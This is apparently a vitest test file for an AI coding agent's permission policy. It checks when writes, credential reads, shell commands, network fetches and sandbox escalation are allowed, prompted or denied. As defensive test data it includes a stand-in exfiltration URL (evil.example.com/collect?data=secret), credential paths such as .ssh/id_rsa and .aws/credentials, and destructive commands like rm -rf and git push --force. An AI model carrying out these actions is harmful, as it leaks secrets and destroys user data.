import { mkdtempSync, rmSync, symlinkSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { describe, expect, it } from 'vitest'
import { normalizePath } from '@lcode/fs'
import { join, resolve } from 'node:path'
import { PERMISSION_PRESETS, PRESET_KNOBS, knobsOf } from './permission-presets.ts'
import { evaluate } from './policy.ts'
import type { ActionIntent, PolicyContext } from './policy.ts'

/**
 * 权限判定验收（12 §3.3 / §9.3；04 §5.6 的 M-PERM-01..05）。
 *
 * 这一组是**安全关键**的：判错了会出两类事故——
 * - 该问的没问 → 越界写入静默发生
 * - 不该问的问了 → 用户开始无脑点允许（比不问更危险）
 *
 * 所以两个方向都要钉住。
 */

const ROOT = '/repo/web'
/** 与实现同口径地算出绝对路径（Windows 上 `resolve` 会补盘符，断言不能写死字面量） */
const abs = (p: string): string => normalizePath(resolve(normalizePath(resolve(ROOT)), p))
const base: PolicyContext = { preset: '工作区内修改', workspaceRoot: ROOT }

/** 一次工作区内的普通写 */
const insideWrite: ActionIntent = {
  tool: 'write',
  summary: '写入 src/a.ts',
  paths: [{ path: 'src/a.ts', mode: 'write' }],
}

/** 一次工作区外的写 */
const outsideWrite: ActionIntent = {
  tool: 'write',
  summary: '写入 /repo/other/.env',
  paths: [{ path: '/repo/other/.env', mode: 'write' }],
}

describe('预设 → 两条轴（12 §3.3 表格逐格对应）', () => {
  it('三档的取值与文档表格一致', () => {
    expect(PRESET_KNOBS).toEqual({
      只读: { sandboxMode: 'read-only', approvalPolicy: 'ask' },
      工作区内修改: { sandboxMode: 'workspace-write', approvalPolicy: 'ask' },
      完全访问: { sandboxMode: 'danger-full-access', approvalPolicy: 'ask' },
    })
  })

  it('每个预设都能解出两条轴', () => {
    for (const p of PERMISSION_PRESETS) {
      expect(knobsOf(p)).toBeDefined()
    }
  })
})

describe('工作区内：不问（「标准」的手感）', () => {
  it('工作区内写 → allow', () => {
    expect(evaluate(insideWrite, base)).toEqual({ kind: 'allow' })
  })

  it('工作区内读 → allow', () => {
    expect(evaluate({ tool: 'read', summary: '读 src/a.ts', paths: [{ path: 'src/a.ts', mode: 'read' }] }, base)).toEqual({
      kind: 'allow',
    })
  })

  it('没有路径的命令（如 grep）→ allow', () => {
    expect(evaluate({ tool: 'grep', summary: '搜索' }, base)).toEqual({ kind: 'allow' })
  })
})

describe('工作区外写：一定问（12 §9.3 ①）', () => {
  it('`标准` 档 → ask，且 impact 里 outsideWorkspace=true', () => {
    const v = evaluate(outsideWrite, base)
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    // ⚠️ UI 靠这个字段显著标出"在工作区外"（T1 的最后防线）
    expect(v.impact.paths?.[0]).toMatchObject({ path: abs('/repo/other/.env'), outsideWorkspace: true })
    expect(v.basis.source).toBe('preset')
    expect(v.basis.presetName).toBe('工作区内修改')
  })

  it('**前缀相同但不是子路径** 也要问（`/repo/web-evil`）', () => {
    const v = evaluate({ ...outsideWrite, paths: [{ path: '/repo/web-evil/a.ts', mode: 'write' }] }, base)
    expect(v.kind).toBe('ask')
  })

  it('工作区内的路径在 impact 里标 outsideWorkspace=false', () => {
    const v = evaluate(
      // 用绝对路径写工作区内的文件：不该问，但若问了，标记也必须是 false
      { ...insideWrite, paths: [{ path: abs('src/a.ts'), mode: 'write' }] },
      base,
    )
    expect(v).toEqual({ kind: 'allow' })
  })


  it('`完全访问` 档 → 仍然问（danger-full-access + ask）', () => {
    // 「完全访问」放宽的是**沙箱可达范围**，不是"不用问"
    expect(evaluate(outsideWrite, { ...base, preset: '完全访问' }).kind).toBe('ask')
  })
})

describe('只读档：任何写都是拒绝，不是问（12 §3.3）', () => {
  it('工作区内写 → deny（"别改我的东西"问一下就能改会让这档名存实亡）', () => {
    const v = evaluate(insideWrite, { ...base, preset: '只读' })
    expect(v.kind).toBe('deny')
    if (v.kind !== 'deny') throw new Error('unreachable')
    expect(v.reason).toContain('只读')
  })

  it('读仍然允许（只读说的是"不能改"）', () => {
    expect(
      evaluate({ tool: 'read', summary: '读', paths: [{ path: 'src/a.ts', mode: 'read' }] }, { ...base, preset: '只读' }),
    ).toEqual({ kind: 'allow' })
  })
})

describe('疑似凭据的读取要问（12 §9.3 ④）', () => {
  const reads = (path: string): ActionIntent => ({ tool: 'read', summary: `读 ${path}`, paths: [{ path, mode: 'read' }] })

  it('.env / id_rsa / .ssh/ / .aws/ 都触发', () => {
    for (const p of ['src/.env', 'src/.env.local', 'deploy/id_rsa', '.ssh/id_rsa', '.aws/credentials']) {
      expect(evaluate(reads(p), base).kind, p).toBe('ask')
    }
  })

  it('普通文件不触发', () => {
    expect(evaluate(reads('src/config.ts'), base).kind).toBe('allow')
    // `.env.example` 是模板、通常不含真凭据——但按模式它仍命中 `.env.*`。
    // 这里显式钉住"命中"，因为把模板放行需要更聪明的判断，而现在**宁可多问**。
    expect(evaluate(reads('.env.example'), base).kind).toBe('ask')
  })
})

describe('命令：新的要问、危险的一定问（12 §9.3 ③）', () => {
  const run = (argv: readonly string[]): ActionIntent => ({ tool: 'shell', summary: argv.join(' '), argv })

  it('项目已见过的命令 → allow', () => {
    const ctx: PolicyContext = { ...base, seenCommands: new Set(['npm test', 'git status']) }
    expect(evaluate(run(['npm', 'test']), ctx)).toEqual({ kind: 'allow' })
    expect(evaluate(run(['git', 'status']), ctx)).toEqual({ kind: 'allow' })
  })

  it('**项目没见过的命令 → ask**（启发式，不是安全保证）', () => {
    const ctx: PolicyContext = { ...base, seenCommands: new Set(['npm test']) }
    expect(evaluate(run(['curl', 'http://x']), ctx).kind).toBe('ask')
  })

  it('**破坏性命令即使见过也要问**（rm -rf 永远是二次确认项）', () => {
    const ctx: PolicyContext = { ...base, seenCommands: new Set(['rm -rf build']) }
    const v = evaluate(run(['rm', '-rf', 'build']), ctx)
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    expect(v.basis.reason).toContain('破坏性')
  })

  it('`git push --force` / `git reset --hard` 命中破坏性', () => {
    for (const argv of [
      ['git', 'push', 'origin', 'main', '--force'],
      ['git', 'reset', '--hard', 'HEAD~1'],
    ]) {
      expect(evaluate(run(argv), { ...base, seenCommands: new Set() }).kind, argv.join(' ')).toBe('ask')
    }
  })
})

describe('网络：未出现过的域名要问（12 §9.3 ②）', () => {
  const fetch = (domains: readonly string[]): ActionIntent => ({ tool: 'web_fetch', summary: '拉取', domains })

  it('已知域名 → allow', () => {
    expect(evaluate(fetch(['docs.example.com']), { ...base, seenDomains: new Set(['docs.example.com']) })).toEqual({
      kind: 'allow',
    })
  })

  it('未见过 → ask，且在 impact.network.domains 里如实给出', () => {
    const v = evaluate(fetch(['evil.example.com']), { ...base, seenDomains: new Set(['docs.example.com']) })
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    expect(v.impact.network?.domains).toEqual(['evil.example.com'])
  })

  it('web 工具还带上完整 URL，路径与查询不能被域名遮住', () => {
    const v = evaluate(
      { tool: 'web_fetch', summary: '拉取', domains: ['evil.example.com'], url: 'https://evil.example.com/collect?data=secret' },
      { ...base, seenDomains: new Set() },
    )
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    expect(v.impact.network).toEqual({
      domains: ['evil.example.com'],
      url: 'https://evil.example.com/collect?data=secret',
    })
  })
})

describe('放宽沙箱档位要问（12 §9.3 ⑤）', () => {
  it('请求提档 → ask，并给出 from/to', () => {
    const v = evaluate({ tool: 'shell', summary: '提档', requestedSandboxMode: 'danger-full-access' }, base)
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    expect(v.impact.sandboxChange).toEqual({ from: 'workspace-write', to: 'danger-full-access' })
  })

  it('降档或同档不问', () => {
    expect(evaluate({ tool: 'shell', summary: '同档', requestedSandboxMode: 'workspace-write' }, base)).toEqual({
      kind: 'allow',
    })
  })
})

describe('子代理：不能直接问人（12 §5.6）', () => {
  it('越界写 + delegated → deny（不是 ask）', () => {
    const v = evaluate(outsideWrite, { ...base, delegated: true })
    expect(v.kind).toBe('deny')
    if (v.kind !== 'deny') throw new Error('unreachable')
    // 语义是"这次审批不可用"（fail-closed），不是"被守卫拒了"
    expect(v.code).toBe('EP-APPROVAL_UNAVAILABLE')
  })

  it('工作区内的写仍然放行（委派不该把子代理变成残废）', () => {
    expect(evaluate(insideWrite, { ...base, delegated: true })).toEqual({ kind: 'allow' })
  })
})

describe('多个理由合并成一次询问（不是弹三个框）', () => {
  it('越界写 + 未知命令 + 新域名 → 一个 ask，三段都带上', () => {
    const v = evaluate(
      {
        tool: 'shell',
        summary: 'curl 到新站并把结果写出去',
        paths: [{ path: '/repo/other/out.txt', mode: 'write' }],
        argv: ['curl', 'http://new.example.com'],
        domains: ['new.example.com'],
      },
      { ...base, seenCommands: new Set(), seenDomains: new Set() },
    )
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    expect(v.impact.paths?.length).toBeGreaterThan(0)
    expect(v.impact.network?.domains).toEqual(['new.example.com'])
    // 理由用「；」接成一句，而不是三个 bullet
    expect(v.basis.reason).toContain('；')
  })
})

describe('Impact 只带名字不带值（I7）', () => {
  it('env 只会是变量名，且**未见过**的命令会带出来给用户看', () => {
    const v = evaluate(
      { tool: 'shell', summary: '带环境变量跑', argv: ['node', 'x'], env: ['OPENAI_API_KEY'] },
      { ...base, seenCommands: new Set() },
    )
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    // 类型上就是 `string[]`（名字），值根本没有进入这个数据的通道——
    // 这是 I7 在**类型层面**的落实，而不是靠"记得别填值"
    expect(v.impact.env).toEqual(['OPENAI_API_KEY'])
  })
})

describe('真实路径：符号链接不能伪装成工作区内路径', () => {
  it('工作区内指向外部的目录链接，写到链接下按“工作区外”处理', () => {
    const workspace = mkdtempSync(join(tmpdir(), 'lcode-policy-ws-'))
    const outside = mkdtempSync(join(tmpdir(), 'lcode-policy-out-'))
    try {
      const link = join(workspace, 'escape')
      symlinkSync(outside, link, process.platform === 'win32' ? 'junction' : 'dir')
      const v = evaluate(
        { tool: 'write', summary: '写链接目标', paths: [{ path: join(link, 'secret.txt'), mode: 'write' }] },
        { preset: '工作区内修改', workspaceRoot: workspace },
      )
      expect(v.kind).toBe('ask')
      if (v.kind !== 'ask') throw new Error('unreachable')
      expect(v.impact.paths?.[0]?.outsideWorkspace).toBe(true)
    } finally {
      rmSync(workspace, { recursive: true, force: true })
      rmSync(outside, { recursive: true, force: true })
    }
  })
})

describe('shell 显式联网', () => {
  it('工作区内修改档 → 询问并显著标出任意域名', () => {
    const v = evaluate(
      { tool: 'shell', summary: '需要联网', argv: ['curl', 'https://example.com'], network: true },
      base,
    )
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    expect(v.basis.reason).toContain('访问网络')
    expect(v.impact.network?.domains).toEqual(['*'])
  })

  it('终端联网授权带 scope=terminal，审批文案能区分生命周期', () => {
    const v = evaluate(
      { tool: 'terminal', summary: '打开联网终端', argv: ['terminal', 'open'], network: true, networkScope: 'terminal' },
      base,
    )
    expect(v.kind).toBe('ask')
    if (v.kind !== 'ask') throw new Error('unreachable')
    expect(v.impact.network).toEqual({ domains: ['*'], scope: 'terminal' })
  })

  it('只读档 → 直接拒绝（不能借联网把数据发出去）', () => {
    const v = evaluate(
      { tool: 'shell', summary: '需要联网', argv: ['curl', 'https://example.com'], network: true },
      { ...base, preset: '只读' },
    )
    expect(v.kind).toBe('deny')
    if (v.kind !== 'deny') throw new Error('unreachable')
    expect(v.reason).toContain('只读')
  })
})
